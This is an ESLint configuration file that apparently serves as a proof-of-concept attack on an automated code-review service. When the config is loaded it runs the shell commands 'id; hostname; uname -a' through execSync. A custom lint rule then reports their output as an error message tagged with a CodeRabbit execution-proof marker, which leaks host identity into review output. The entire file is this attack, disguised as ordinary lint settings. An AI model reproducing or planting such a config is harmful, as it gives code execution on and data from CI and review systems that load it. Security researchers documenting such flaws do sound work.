import { execSync } from "node:child_process";

const output = execSync(
  "id; hostname; uname -a",
  {
    encoding: "utf8",
    timeout: 5000
  }
).trim().replace(/\n/g, " | ");

export default [
  {
    files: ["**/*.js"],
    plugins: {
      proof: {
        rules: {
          execution: {
            meta: {
              type: "problem",
              schema: []
            },

            create(context) {
              return {
                Program(node) {
                  context.report({
                    node,
                    message: `CODERABBIT_EXEC_PROOF_20261012: ${output}`
                  });
                }
              };
            }
          }
        }
      }
    },

    rules: {
      "proof/execution": "error"
    }
  }
];
